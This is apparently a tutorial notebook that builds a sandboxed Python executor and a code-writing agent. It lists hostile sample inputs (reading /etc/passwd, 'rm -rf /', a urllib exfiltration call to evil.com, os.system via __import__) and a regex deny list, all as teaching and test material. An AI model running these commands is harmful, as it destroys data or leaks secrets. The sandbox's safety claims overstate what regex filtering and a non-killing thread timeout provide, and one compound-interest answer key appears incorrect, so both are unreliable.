# Code Execution Tool — Safe Code Generation and Execution

[![Open in Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/cyruslayo/castalia/blob/main/agents/14_code_execution_tool.ipynb)

## What This Notebook Teaches You

An agent that can **write and run code** can solve problems that are impossible with static tools alone. Need to compute a complex formula? Filter a dataset? Implement an algorithm? A code-execution agent writes the Python, runs it, inspects the output, and iterates until it succeeds.

But code execution is also the most **dangerous** capability you can give an agent. Unrestricted `exec()` is a security nightmare. This notebook builds a safe, sandboxed code execution tool from first principles.

**Research foundation**:
- Gao et al. 2023, *"PAL: Program-Aided Language Models"* — showed that generating code for computation dramatically outperforms pure reasoning
- Chen et al. 2023, *"Program of Thoughts Prompting"* — decoupled reasoning from computation by generating programs
- Wang et al. 2024, *"Executable Code Actions Elicit Better LLM Agents"* — agents that execute code outperform those using fixed tool APIs

By the end of this notebook, you will:

1. **Understand why code execution is a game-changer** for agent capabilities
2. **Identify security risks** — what can go wrong with unrestricted exec
3. **Build a Sandbox class** with restricted builtins, import whitelists, and timeouts
4. **Build a CodeExecutor tool** with execute, validate, and format_result methods
5. **Test the sandbox** against dangerous code patterns
6. **Build a CodeAgent** that writes Python to solve problems using ReAct
7. **Implement iterative code refinement** — write, run, fix, rerun
8. **Compare code-agent vs. direct reasoning** on computational tasks

---

> **Prerequisites**: Notebooks 01–04, 13 (tool design).
> **Runtime**: Google Colab with T4 GPU.
> **Time**: ~55–70 minutes.

## Part 0: Environment Setup

Same Qwen3-8B setup. The model will write Python code, and our sandbox will execute it safely.

In [ ]:
# --- Google Colab Setup ---
# Install dependencies (run once per session)
!pip install -q transformers>=4.51.0 accelerate bitsandbytes torch

import torch
import time
import json
import re
import math
import inspect
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Callable, Tuple, Union, get_type_hints
from collections import defaultdict
from google.colab import drive
from transformers import AutoModelForCausalLM, AutoTokenizer, BitsAndBytesConfig

# Mount Google Drive for model caching (faster subsequent loads)
drive.mount('/content/drive')
CACHE_DIR = "/content/drive/MyDrive/models"

# Load open-source model with 4-bit quantization (fits Colab T4 16GB GPU)
MODEL_NAME = "Qwen/Qwen3-8B"

quantization_config = BitsAndBytesConfig(
    load_in_4bit=True,
    bnb_4bit_compute_dtype=torch.bfloat16,
    bnb_4bit_quant_type="nf4",
)

tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME, cache_dir=CACHE_DIR)
model = AutoModelForCausalLM.from_pretrained(
    MODEL_NAME,
    device_map="auto",
    quantization_config=quantization_config,
    cache_dir=CACHE_DIR,
    torch_dtype="auto",
)

def generate(messages, max_new_tokens=512, temperature=0.7, do_sample=True):
    """Generate a response from the model given a list of chat messages."""
    text = tokenizer.apply_chat_template(
        messages, tokenize=False, add_generation_prompt=True, enable_thinking=False
    )
    inputs = tokenizer([text], return_tensors="pt").to(model.device)
    output_ids = model.generate(
        **inputs,
        max_new_tokens=max_new_tokens,
        temperature=temperature if do_sample else None,
        do_sample=do_sample,
        top_k=20,
    )
    generated = output_ids[0][inputs.input_ids.shape[1]:]
    return tokenizer.decode(generated, skip_special_tokens=True)

print(f"✓ Model loaded: {MODEL_NAME}")
print(f"  Parameters: {sum(p.numel() for p in model.parameters()):,}")
print(f"  GPU memory used: {torch.cuda.memory_allocated() / 1024**3:.1f} GB")
print(f"  Vocabulary size: {len(tokenizer):,} tokens")

## 1. Why Code Execution Is a Game-Changer

### 1.1 — The Limits of Fixed Tools

In Notebook 13, we built 10+ tools. But there are infinite computations, and we can't build a tool for each one. Consider:

- "What's the 47th Fibonacci number?" — no Fibonacci tool
- "Parse this CSV and find rows where column B > 100" — no CSV-filter tool  
- "What's the standard deviation of [2.3, 5.7, ...100 numbers]?" — too many numbers for a prompt

### 1.2 — Code as a Universal Tool

A code execution tool is a **meta-tool**: instead of calling `calculator("2+3")`, the agent writes:

```python
result = 2 + 3
print(result)
```

This is strictly more powerful — any fixed tool can be replicated with code, but code can do things no fixed tool covers.

### 1.3 — The Power Hierarchy

```
Level 1: Direct LLM reasoning     → "I think the answer is approximately 42"
Level 2: Fixed tools               → calculator("sqrt(1764)")  →  42.0
Level 3: Code execution            → Can solve ANY computable problem
```

**But with great power comes great responsibility.** Let's see what can go wrong.

## 2. Security Risks — Why Unrestricted exec() Is Dangerous

Before building the sandbox, we need to understand the threats. Here are real attacks an LLM might generate — accidentally or via prompt injection.

In [ ]:
# ⚠️ DANGER ZONE — These are EXAMPLES of dangerous code.
# We will NOT execute them. We'll show them to understand the risks.

dangerous_examples = [
    {
        "name": "File System Access",
        "code": """import os; os.listdir('/'); open('/etc/passwd').read()""",
        "risk": "Read sensitive files, traverse directories, exfiltrate data",
    },
    {
        "name": "System Commands",
        "code": """import subprocess; subprocess.run(['rm', '-rf', '/'], shell=True)""",
        "risk": "Execute arbitrary shell commands, destroy data",
    },
    {
        "name": "Network Access",
        "code": """import urllib.request; urllib.request.urlopen('http://evil.com/steal?data=...')""",
        "risk": "Exfiltrate data, download malware, call external APIs",
    },
    {
        "name": "Infinite Loop",
        "code": """while True: pass""",
        "risk": "Denial of service — consumes CPU forever, no way to recover",
    },
    {
        "name": "Memory Bomb",
        "code": """x = 'A' * (10**10)""",
        "risk": "Allocate gigabytes of memory, crash the system",
    },
    {
        "name": "Import Hijacking",
        "code": """__import__('os').system('whoami')""",
        "risk": "Bypass import restrictions using __import__ builtin",
    },
    {
        "name": "Code Injection via eval",
        "code": """eval("__import__('os').system('ls')")""",
        "risk": "Nested evaluation bypasses surface-level code scanning",
    },
]

print("=" * 70)
print(f"{'DANGEROUS CODE PATTERNS':^70}")
print("=" * 70)
for i, ex in enumerate(dangerous_examples, 1):
    print(f"\n{i}. {ex['name']}")
    print(f"   Code: {ex['code'][:80]}...")
    print(f"   Risk: {ex['risk']}")

print("\n" + "=" * 70)
print("Our sandbox must block ALL of these patterns.")
print("=" * 70)

## 3. Building the Sandbox

Our sandbox uses **defense in depth** — multiple layers of protection:

1. **Static analysis** — scan code for dangerous patterns before running
2. **Restricted builtins** — remove `__import__`, `exec`, `eval`, `open`, `compile`
3. **Import whitelist** — only allow safe, computation-focused modules
4. **Timeout** — kill execution after N seconds via threading
5. **stdout/stderr capture** — isolate output from the real console

In [ ]:
import threading
import io
import sys
import traceback
import ast
import textwrap

class Sandbox:
    """A restricted Python execution environment."""

    # Modules that are safe for computation
    ALLOWED_IMPORTS = {
        'math', 'statistics', 'collections', 'itertools', 'functools',
        'json', 're', 'datetime', 'string', 'random', 'decimal',
        'fractions', 'operator', 'textwrap', 'copy', 'heapq', 'bisect',
    }

    # Patterns that indicate dangerous code
    DANGEROUS_PATTERNS = [
        (r'\b__import__\b', "Direct __import__ call"),
        (r'\bexec\s*\(', "exec() call"),
        (r'\beval\s*\(', "eval() call"),
        (r'\bopen\s*\(', "open() file access"),
        (r'\bcompile\s*\(', "compile() call"),
        (r'\bglobals\s*\(', "globals() access"),
        (r'\blocals\s*\(', "locals() access"),
        (r'\bgetattr\s*\(', "getattr() — potential attribute access exploit"),
        (r'\bsetattr\s*\(', "setattr() — potential attribute modification"),
        (r'\bdelattr\s*\(', "delattr() — potential attribute deletion"),
        (r'\b__subclasses__\b', "Class hierarchy traversal"),
        (r'\b__bases__\b', "Base class access"),
        (r'\b__mro__\b', "MRO traversal"),
        (r'\bos\.', "os module access"),
        (r'\bsys\.', "sys module access"),
        (r'\bsubprocess', "subprocess module"),
        (r'\bshutil', "shutil module"),
        (r'\bsocket', "socket module"),
        (r'\burllib', "urllib module"),
        (r'\brequests', "requests module"),
    ]

    # Safe builtins — computation-only, no I/O or code generation
    SAFE_BUILTINS = {
        'abs': abs, 'all': all, 'any': any, 'bin': bin, 'bool': bool,
        'chr': chr, 'complex': complex, 'dict': dict, 'divmod': divmod,
        'enumerate': enumerate, 'filter': filter, 'float': float,
        'format': format, 'frozenset': frozenset, 'hash': hash, 'hex': hex,
        'int': int, 'isinstance': isinstance, 'issubclass': issubclass,
        'iter': iter, 'len': len, 'list': list, 'map': map, 'max': max,
        'min': min, 'next': next, 'oct': oct, 'ord': ord, 'pow': pow,
        'print': print,  # will be redirected to StringIO
        'range': range, 'repr': repr, 'reversed': reversed, 'round': round,
        'set': set, 'slice': slice, 'sorted': sorted, 'str': str,
        'sum': sum, 'tuple': tuple, 'type': type, 'zip': zip,
        'True': True, 'False': False, 'None': None,
    }

    def __init__(self, timeout: int = 5, max_output_chars: int = 5000):
        self.timeout = timeout
        self.max_output_chars = max_output_chars

    def _safe_import(self, name, *args, **kwargs):
        """Restricted import that only allows whitelisted modules."""
        # Handle 'from X import Y' — name is the top-level module
        top_level = name.split('.')[0]
        if top_level not in self.ALLOWED_IMPORTS:
            raise ImportError(
                f"Module '{name}' is not allowed. "
                f"Allowed modules: {sorted(self.ALLOWED_IMPORTS)}"
            )
        return __builtins__['__import__'](name, *args, **kwargs) if isinstance(__builtins__, dict) else __import__(name, *args, **kwargs)

    def validate(self, code_string: str) -> dict:
        """Static analysis — check code for dangerous patterns before execution."""
        issues = []

        # Check for dangerous patterns via regex
        for pattern, description in self.DANGEROUS_PATTERNS:
            if re.search(pattern, code_string):
                issues.append({"type": "dangerous_pattern", "detail": description, "pattern": pattern})

        # Check imports against whitelist via AST
        try:
            tree = ast.parse(code_string)
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        top = alias.name.split('.')[0]
                        if top not in self.ALLOWED_IMPORTS:
                            issues.append({"type": "forbidden_import", "module": alias.name,
                                           "allowed": sorted(self.ALLOWED_IMPORTS)})
                elif isinstance(node, ast.ImportFrom):
                    if node.module:
                        top = node.module.split('.')[0]
                        if top not in self.ALLOWED_IMPORTS:
                            issues.append({"type": "forbidden_import", "module": node.module,
                                           "allowed": sorted(self.ALLOWED_IMPORTS)})
        except SyntaxError as e:
            issues.append({"type": "syntax_error", "detail": str(e)})

        return {
            "safe": len(issues) == 0,
            "issues": issues,
            "code_length": len(code_string),
            "line_count": code_string.count("\n") + 1,
        }

    def execute(self, code_string: str) -> dict:
        """Execute code in a sandboxed environment with timeout."""
        start_time = time.time()

        # Step 1: Validate
        validation = self.validate(code_string)
        if not validation["safe"]:
            return {
                "success": False,
                "error": "Code failed safety validation",
                "issues": validation["issues"],
                "stdout": "",
                "stderr": "",
                "execution_time": 0,
            }

        # Step 2: Set up restricted globals
        stdout_capture = io.StringIO()
        stderr_capture = io.StringIO()

        restricted_builtins = dict(self.SAFE_BUILTINS)
        restricted_builtins['__import__'] = self._safe_import
        restricted_builtins['print'] = lambda *args, **kwargs: print(*args, file=stdout_capture, **kwargs)

        restricted_globals = {
            '__builtins__': restricted_builtins,
            '__name__': '__sandbox__',
        }

        # Step 3: Execute with timeout
        result_container = {"return_value": None, "error": None}

        def run_code():
            try:
                exec(code_string, restricted_globals)
                # Capture last expression value if possible
                try:
                    tree = ast.parse(code_string)
                    if tree.body and isinstance(tree.body[-1], ast.Expr):
                        last_expr = ast.Expression(tree.body[-1].value)
                        compiled = compile(last_expr, '<sandbox>', 'eval')
                        result_container["return_value"] = eval(compiled, restricted_globals)
                except:
                    pass
            except Exception as e:
                result_container["error"] = f"{type(e).__name__}: {e}"
                print(traceback.format_exc(), file=stderr_capture)

        thread = threading.Thread(target=run_code)
        thread.start()
        thread.join(timeout=self.timeout)

        execution_time = time.time() - start_time

        if thread.is_alive():
            return {
                "success": False,
                "error": f"Execution timed out after {self.timeout} seconds. Your code may have an infinite loop.",
                "stdout": stdout_capture.getvalue()[:self.max_output_chars],
                "stderr": "",
                "execution_time": self.timeout,
            }

        stdout_text = stdout_capture.getvalue()[:self.max_output_chars]
        stderr_text = stderr_capture.getvalue()[:self.max_output_chars]

        if result_container["error"]:
            return {
                "success": False,
                "error": result_container["error"],
                "stdout": stdout_text,
                "stderr": stderr_text,
                "execution_time": round(execution_time, 4),
            }

        return {
            "success": True,
            "return_value": repr(result_container["return_value"]) if result_container["return_value"] is not None else None,
            "stdout": stdout_text,
            "stderr": stderr_text,
            "execution_time": round(execution_time, 4),
        }

sandbox = Sandbox(timeout=5)
print("✓ Sandbox created")
print(f"  Timeout: {sandbox.timeout}s")
print(f"  Allowed imports: {sorted(sandbox.ALLOWED_IMPORTS)}")
print(f"  Blocked builtins: exec, eval, open, compile, __import__ (replaced with safe version)")
print(f"  Dangerous patterns checked: {len(sandbox.DANGEROUS_PATTERNS)}")

## 4. Testing the Sandbox

### 4.1 — Safe Code Should Work

Let's verify that legitimate computational code runs fine.

In [ ]:
safe_tests = [
    ("Basic math", "print(2 + 3 * 4)"),
    ("List comprehension", "squares = [x**2 for x in range(10)]\nprint(squares)"),
    ("String operations", "text = 'hello world'\nprint(text.upper())\nprint(len(text))"),
    ("Math module", "import math\nprint(math.sqrt(144))\nprint(math.pi)"),
    ("Statistics", "import statistics\ndata = [10, 20, 30, 40, 50]\nprint(statistics.mean(data))\nprint(statistics.stdev(data))"),
    ("Collections", "from collections import Counter\nwords = ['a','b','a','c','b','a']\nprint(Counter(words))"),
    ("JSON processing", "import json\ndata = {'name': 'Alice', 'scores': [90, 85, 92]}\nprint(json.dumps(data, indent=2))"),
    ("Regex", "import re\ntext = 'My email is user@example.com and phone is 555-1234'\nprint(re.findall(r'[\\w.]+@[\\w.]+', text))"),
    ("Itertools", "import itertools\nperms = list(itertools.permutations([1,2,3]))\nprint(f'Permutations of [1,2,3]: {len(perms)} total')"),
    ("Datetime", "from datetime import datetime, timedelta\nnow = datetime(2024, 6, 15)\nfuture = now + timedelta(days=30)\nprint(f'30 days from {now.date()} is {future.date()}')"),
]

print("=" * 70)
print(f"{'SAFE CODE TESTS':^70}")
print("=" * 70)
for name, code_str in safe_tests:
    result = sandbox.execute(code_str)
    status = "✓" if result["success"] else "✗"
    output = result["stdout"].strip()[:60] if result["success"] else result["error"][:60]
    print(f"  {status} {name:<25} → {output}")

### 4.2 — Dangerous Code Should Be Blocked

Now let's verify that every attack vector is caught.

In [ ]:
dangerous_tests = [
    ("File access", "open('/etc/passwd').read()"),
    ("OS module", "import os\nos.listdir('/')"),
    ("Subprocess", "import subprocess\nsubprocess.run(['ls'])"),
    ("Network access", "import urllib.request\nurllib.request.urlopen('http://evil.com')"),
    ("Socket", "import socket\ns = socket.socket()"),
    ("Direct __import__", "__import__('os').listdir('/')"),
    ("eval bypass", "eval('1+1')"),
    ("exec bypass", "exec('print(1)')"),
    ("compile bypass", "compile('1+1', '', 'eval')"),
    ("Globals access", "globals()"),
    ("Sys access", "import sys\nsys.exit(1)"),
]

print("=" * 70)
print(f"{'DANGEROUS CODE TESTS (all should be blocked)':^70}")
print("=" * 70)
blocked = 0
for name, code_str in dangerous_tests:
    result = sandbox.execute(code_str)
    if not result["success"]:
        blocked += 1
        reason = result.get("error", "")[:50]
        if result.get("issues"):
            reason = result["issues"][0].get("detail", reason)[:50]
        print(f"  ✓ BLOCKED: {name:<25} → {reason}")
    else:
        print(f"  ✗ ALLOWED: {name:<25} → THIS IS A SECURITY HOLE!")

print(f"\nBlocked {blocked}/{len(dangerous_tests)} dangerous patterns ({blocked/len(dangerous_tests):.0%})")
assert blocked == len(dangerous_tests), "Security breach detected!"

### 4.3 — Timeout Protection

In [ ]:
print("Testing timeout protection (5-second limit)...\n")

# Infinite loop
result = sandbox.execute("while True: pass")
print(f"Infinite loop: {'BLOCKED' if not result['success'] else 'ALLOWED!'}")
print(f"  Error: {result['error']}")
print(f"  Time: {result['execution_time']}s")

# Long computation (should finish within timeout)
result = sandbox.execute("total = sum(i*i for i in range(1000000))\nprint(f'Sum of squares: {total}')")
print(f"\nLong but finite computation: {'OK' if result['success'] else 'FAILED'}")
print(f"  Output: {result['stdout'].strip()}")
print(f"  Time: {result['execution_time']}s")

## 5. The CodeExecutor Tool

We wrap the sandbox in a tool class that provides a clean interface for the agent. This adds:
- Pre-execution validation with detailed feedback
- Result formatting that helps the LLM understand output
- Execution history for debugging

In [ ]:
class CodeExecutor:
    """Production code execution tool built on the Sandbox."""

    def __init__(self, timeout: int = 5):
        self.sandbox = Sandbox(timeout=timeout)
        self.history: List[dict] = []

    def execute(self, code_string: str) -> dict:
        """Execute code safely and return a structured result."""
        # Clean up the code
        code_string = textwrap.dedent(code_string).strip()
        if not code_string:
            return {"success": False, "error": "Empty code string. Please provide Python code to execute."}

        result = self.sandbox.execute(code_string)

        # Record in history
        self.history.append({
            "code": code_string,
            "result": result,
            "timestamp": time.time(),
        })

        return result

    def validate(self, code_string: str) -> dict:
        """Pre-check code safety without executing."""
        return self.sandbox.validate(code_string)

    def format_result(self, result: dict) -> str:
        """Format execution result as a human-readable string for the agent."""
        lines = []
        if result["success"]:
            lines.append("✓ Code executed successfully.")
            if result["stdout"]:
                lines.append(f"Output:\n{result['stdout']}")
            if result.get("return_value"):
                lines.append(f"Return value: {result['return_value']}")
            lines.append(f"Execution time: {result['execution_time']}s")
        else:
            lines.append(f"✗ Code execution failed: {result['error']}")
            if result.get("issues"):
                lines.append("Safety issues found:")
                for issue in result["issues"]:
                    lines.append(f"  - {issue.get('type', 'unknown')}: {issue.get('detail', issue.get('module', ''))}")
            if result.get("stdout"):
                lines.append(f"Partial output:\n{result['stdout']}")
            if result.get("stderr"):
                lines.append(f"Error trace:\n{result['stderr'][:500]}")
        return "\n".join(lines)

    def get_stats(self) -> dict:
        total = len(self.history)
        successes = sum(1 for h in self.history if h["result"]["success"])
        avg_time = statistics.mean(h["result"].get("execution_time", 0) for h in self.history) if self.history else 0
        return {
            "total_executions": total,
            "successes": successes,
            "failures": total - successes,
            "success_rate": f"{successes/total:.1%}" if total else "N/A",
            "avg_execution_time": f"{avg_time:.4f}s",
        }

executor = CodeExecutor(timeout=5)

# Test it
print("--- CodeExecutor Demo ---\n")

result = executor.execute("""
import math
numbers = [16, 25, 36, 49, 64, 81, 100]
roots = [math.sqrt(n) for n in numbers]
for n, r in zip(numbers, roots):
    print(f"sqrt({n}) = {r:.1f}")
print(f"\nSum of roots: {sum(roots):.2f}")
""")

print(executor.format_result(result))

### 5.1 — Error Handling in Action

Let's see how the CodeExecutor handles various error types — the error messages should help the agent fix the code.

In [ ]:
error_tests = [
    ("Syntax Error", "def foo(\n  return 1"),
    ("Name Error", "print(undefined_variable)"),
    ("Type Error", "result = 'hello' + 42"),
    ("Zero Division", "x = 1 / 0"),
    ("Index Error", "lst = [1,2,3]\nprint(lst[10])"),
    ("Key Error", "d = {'a': 1}\nprint(d['b'])"),
    ("Value Error", "int('not_a_number')"),
    ("Import Error", "import numpy"),
]

print("=" * 70)
print(f"{'ERROR HANDLING DEMO':^70}")
print("=" * 70)

for name, code_str in error_tests:
    result = executor.execute(code_str)
    formatted = executor.format_result(result)
    # Show just the first line of the formatted result
    first_line = formatted.split("\n")[0]
    error_info = result.get("error", "")[:60] or (result.get("issues", [{}])[0].get("detail", "")[:60] if result.get("issues") else "")
    print(f"\n{name}:")
    print(f"  Code:  {code_str[:50]}...")
    print(f"  Error: {error_info}")

## 6. The CodeAgent — An Agent That Writes and Runs Code

This is the culmination: an agent that uses ReAct-style reasoning to:
1. Analyze the problem
2. Write Python code to solve it
3. Execute the code via our sandbox
4. Inspect the output
5. If there's an error, analyze it and write fixed code
6. Repeat until successful

This pattern is inspired by **PAL (Program-Aided Language Models)** — use the LLM for reasoning and code generation, but use the Python runtime for computation.

In [ ]:
class CodeAgent:
    """Agent that writes and executes Python code to solve problems."""

    def __init__(self, executor: CodeExecutor, max_iterations: int = 5):
        self.executor = executor
        self.max_iterations = max_iterations

    def _build_system_prompt(self) -> str:
        return """You are a Python coding assistant. You solve problems by writing and executing Python code.

WORKFLOW:
1. Analyze the problem
2. Write Python code to solve it
3. I will execute your code and show you the output
4. If there's an error, fix the code and try again

RESPONSE FORMAT — always respond with this exact JSON:
{"thought": "your analysis of what to do", "code": "python code to execute"}

When you have the final answer after seeing code output:
{"thought": "analysis of the results", "answer": "your final answer based on the code output"}

RULES:
- Always use print() to display results — that's how I capture output
- Available modules: math, statistics, collections, itertools, json, re, datetime, string, random, functools, decimal, fractions
- Do NOT use: os, sys, subprocess, open(), eval(), exec(), __import__
- Write clean, readable code with comments
- If you get an error, carefully read it and fix the specific issue"""

    def run(self, query: str, verbose: bool = True) -> dict:
        """Run the CodeAgent on a query."""
        messages = [
            {"role": "system", "content": self._build_system_prompt()},
            {"role": "user", "content": f"Solve this problem using Python code:\n\n{query}"},
        ]

        iterations = []
        for i in range(self.max_iterations):
            response = generate(messages, max_new_tokens=600, temperature=0.3)

            # Parse JSON response
            try:
                json_match = re.search(r'\{[\s\S]*\}', response)
                if not json_match:
                    iterations.append({"iteration": i, "type": "answer", "content": response})
                    return {"answer": response, "iterations": iterations, "code_runs": i}
                parsed = json.loads(json_match.group())
            except json.JSONDecodeError:
                iterations.append({"iteration": i, "type": "parse_error", "raw": response})
                messages.append({"role": "assistant", "content": response})
                messages.append({"role": "user", "content": "Your response was not valid JSON. Please respond with the exact format: {\"thought\": \"...\", \"code\": \"...\"} or {\"thought\": \"...\", \"answer\": \"...\"}"})
                continue

            thought = parsed.get("thought", "")

            # If agent has the answer
            if "answer" in parsed:
                iterations.append({"iteration": i, "type": "answer", "thought": thought, "answer": parsed["answer"]})
                if verbose:
                    print(f"  [Iteration {i}] ANSWER: {parsed['answer'][:100]}...")
                return {"answer": parsed["answer"], "iterations": iterations, "code_runs": len([it for it in iterations if it["type"] == "code"])}

            # If agent wrote code
            if "code" in parsed:
                code_str = parsed["code"]
                if verbose:
                    print(f"  [Iteration {i}] Thought: {thought[:80]}...")
                    print(f"  [Iteration {i}] Running code ({len(code_str)} chars)...")

                result = self.executor.execute(code_str)
                formatted = self.executor.format_result(result)
                iterations.append({
                    "iteration": i, "type": "code", "thought": thought,
                    "code": code_str, "result": result, "formatted": formatted
                })

                if verbose:
                    status = "✓" if result["success"] else "✗"
                    output_preview = (result.get("stdout", "") or result.get("error", ""))[:80]
                    print(f"  [Iteration {i}] {status} Output: {output_preview}")

                # Feed result back
                messages.append({"role": "assistant", "content": response})
                if result["success"]:
                    messages.append({"role": "user", "content": f"Code executed successfully.\nOutput:\n{result['stdout']}\n\nNow provide your final answer based on the output. Respond with: {{\"thought\": \"...\", \"answer\": \"...\"}}"})
                else:
                    messages.append({"role": "user", "content": f"Code execution failed:\n{formatted}\n\nPlease fix the code and try again."})
            else:
                iterations.append({"iteration": i, "type": "other", "raw": response})
                messages.append({"role": "assistant", "content": response})
                messages.append({"role": "user", "content": "Please provide either code to execute or a final answer."})

        return {"answer": "Max iterations reached without solution", "iterations": iterations, "code_runs": len([it for it in iterations if it["type"] == "code"])}

code_agent = CodeAgent(executor, max_iterations=5)
print("✓ CodeAgent created")
print(f"  Max iterations: {code_agent.max_iterations}")
print(f"  Sandbox timeout: {executor.sandbox.timeout}s")
print(f"  Allowed modules: {sorted(executor.sandbox.ALLOWED_IMPORTS)}")

## 7. Testing on Real Tasks

### Task 1: Complex Math Computation

In [ ]:
print("=" * 60)
print("TASK 1: Complex Math Computation")
print("=" * 60)
result = code_agent.run(
    "Calculate the first 20 Fibonacci numbers. Then find the golden ratio "
    "by dividing each consecutive pair (F(n+1)/F(n)) for the last 5 pairs. "
    "Show how the ratios converge to phi (1.6180339...)."
)
print(f"\nFinal answer: {result['answer'][:300]}...")
print(f"Code runs: {result['code_runs']}")

### Task 2: Data Analysis

In [ ]:
print("=" * 60)
print("TASK 2: Data Analysis")
print("=" * 60)
result = code_agent.run(
    "I have monthly sales data: "
    "Jan=12500, Feb=13200, Mar=14800, Apr=13900, May=15600, Jun=16200, "
    "Jul=15100, Aug=14700, Sep=16800, Oct=17200, Nov=18500, Dec=19100. "
    "Calculate: 1) Total annual sales, 2) Monthly average, 3) Month with highest sales, "
    "4) Month-over-month growth rates, 5) Which quarter performed best."
)
print(f"\nFinal answer: {result['answer'][:400]}...")
print(f"Code runs: {result['code_runs']}")

### Task 3: String Manipulation

In [ ]:
print("=" * 60)
print("TASK 3: String Manipulation")
print("=" * 60)
result = code_agent.run(
    "Given the text: 'The quick brown fox jumps over the lazy dog. "
    "The dog barked at the fox. The fox ran away quickly.' "
    "1) Count word frequencies, 2) Find the most common word (excluding 'the'), "
    "3) Calculate the average word length, 4) Find all unique words sorted alphabetically."
)
print(f"\nFinal answer: {result['answer'][:400]}...")
print(f"Code runs: {result['code_runs']}")

### Task 4: Algorithm Implementation

In [ ]:
print("=" * 60)
print("TASK 4: Algorithm Implementation")
print("=" * 60)
result = code_agent.run(
    "Implement and run a prime sieve (Sieve of Eratosthenes) to find all prime numbers "
    "up to 100. Then calculate: 1) How many primes are there below 100? "
    "2) What's the sum of all primes below 100? 3) What's the largest prime gap? "
    "4) What's the twin prime pairs (primes differing by 2)?"
)
print(f"\nFinal answer: {result['answer'][:400]}...")
print(f"Code runs: {result['code_runs']}")

### Task 5: Statistical Analysis

In [ ]:
print("=" * 60)
print("TASK 5: Statistical Analysis")
print("=" * 60)
result = code_agent.run(
    "Generate two datasets using random seed 42: "
    "Group A: 30 values from a normal distribution with mean=75, stdev=10. "
    "Group B: 30 values from a normal distribution with mean=80, stdev=12. "
    "Calculate for each group: mean, median, stdev, min, max. "
    "Then compute the difference in means and the Cohen's d effect size."
)
print(f"\nFinal answer: {result['answer'][:400]}...")
print(f"Code runs: {result['code_runs']}")

## 8. Iterative Code Refinement

The real power of a CodeAgent is **self-correction**: when code fails, the agent reads the error, understands it, and writes fixed code. Let's test this with deliberately tricky problems.

In [ ]:
print("=" * 60)
print("ITERATIVE REFINEMENT TEST")
print("=" * 60)
print("\nThis problem requires careful code — the agent may need multiple attempts:\n")

result = code_agent.run(
    "Write a function that converts a Roman numeral string to an integer. "
    "Test it with: III=3, IV=4, IX=9, XLII=42, XCIX=99, CDXLIV=444, MCMXCIV=1994, MMXXIV=2024. "
    "Print each test case showing input and output, and whether it matches the expected value."
)
print(f"\nFinal answer: {result['answer'][:400]}...")
print(f"Total iterations: {len(result['iterations'])}")
print(f"Code runs: {result['code_runs']}")
print("\nIteration breakdown:")
for it in result["iterations"]:
    if it["type"] == "code":
        status = "✓" if it["result"]["success"] else "✗"
        print(f"  Iteration {it['iteration']}: {status} Code ({len(it['code'])} chars)")
    elif it["type"] == "answer":
        print(f"  Iteration {it['iteration']}: ANSWER")

In [ ]:
print("=" * 60)
print("REFINEMENT TEST 2: Multi-step Problem")
print("=" * 60)
print()

result = code_agent.run(
    "Implement a Caesar cipher with both encrypt and decrypt functions. "
    "The cipher should handle uppercase and lowercase letters, and leave non-letter characters unchanged. "
    "Test with: encrypt('Hello, World!', 13) and verify decrypt gives back the original. "
    "Also show that double-encrypting with shift 13 (ROT13) returns the original text."
)
print(f"\nFinal answer: {result['answer'][:400]}...")
print(f"Code runs: {result['code_runs']}")

## 9. Comparison: Code Agent vs. Direct Reasoning

When does code execution help? Let's test the same questions with:
1. **Direct reasoning** — LLM answers purely from its parametric knowledge
2. **Code agent** — LLM writes code, executes it, reports results

We expect code to win on **computation** but not on **general knowledge**.

In [ ]:
def direct_reasoning(query: str) -> str:
    """Ask the LLM to answer without any tools."""
    messages = [
        {"role": "system", "content": "Answer the question directly. Show your work. Be precise with numbers."},
        {"role": "user", "content": query},
    ]
    return generate(messages, max_new_tokens=400, temperature=0.3)

comparison_tasks = [
    {
        "name": "Large Factorial",
        "query": "What is 20 factorial (20!)? Give the exact number.",
        "exact_answer": "2432902008176640000",
        "type": "computation",
    },
    {
        "name": "Sum of Squares",
        "query": "What is the sum of squares of all integers from 1 to 50?",
        "exact_answer": "42925",
        "type": "computation",
    },
    {
        "name": "Compound Interest",
        "query": "If I invest $10000 at 7.5% annual interest compounded monthly for 15 years, what's the final amount? Give the answer to 2 decimal places.",
        "exact_answer": "30632.43",
        "type": "computation",
    },
]

print("=" * 70)
print(f"{'CODE AGENT vs. DIRECT REASONING':^70}")
print("=" * 70)

results_table = []
for task in comparison_tasks:
    print(f"\n--- {task['name']} ---")
    print(f"Query: {task['query']}")
    print(f"Exact answer: {task['exact_answer']}\n")

    # Direct reasoning
    print("Direct reasoning:")
    direct = direct_reasoning(task["query"])
    direct_has_answer = task["exact_answer"] in direct
    print(f"  Response: {direct[:150]}...")
    print(f"  Contains exact answer: {direct_has_answer}")

    # Code agent
    print("\nCode agent:")
    code_result = code_agent.run(task["query"], verbose=False)
    code_has_answer = task["exact_answer"] in str(code_result.get("answer", ""))
    print(f"  Answer: {str(code_result['answer'])[:150]}...")
    print(f"  Contains exact answer: {code_has_answer}")
    print(f"  Code runs: {code_result['code_runs']}")

    results_table.append({
        "task": task["name"], "type": task["type"],
        "direct_correct": direct_has_answer, "code_correct": code_has_answer,
    })

In [ ]:
print("\n" + "=" * 70)
print(f"{'COMPARISON SUMMARY':^70}")
print("=" * 70)
print(f"\n{'Task':<25} {'Type':<15} {'Direct':<12} {'Code Agent':<12}")
print("-" * 65)
for r in results_table:
    direct = "✓" if r["direct_correct"] else "✗"
    code_a = "✓" if r["code_correct"] else "✗"
    print(f"{r['task']:<25} {r['type']:<15} {direct:<12} {code_a:<12}")

direct_score = sum(1 for r in results_table if r["direct_correct"])
code_score = sum(1 for r in results_table if r["code_correct"])
total = len(results_table)
print(f"\nDirect reasoning: {direct_score}/{total} correct")
print(f"Code agent:       {code_score}/{total} correct")

print("\n--- Key Insight ---")
print("Code execution excels at:")
print("  • Precise numerical computation (no rounding errors)")
print("  • Complex multi-step calculations")
print("  • Problems requiring iteration or algorithms")
print("  • Data manipulation and analysis")
print("\nDirect reasoning excels at:")
print("  • General knowledge questions")
print("  • Qualitative analysis and opinions")
print("  • Tasks where writing code is slower than just answering")
print("  • Creative or open-ended tasks")

## 10. Execution Statistics

Let's review how the CodeExecutor performed across all our tests.

In [ ]:
stats = executor.get_stats()
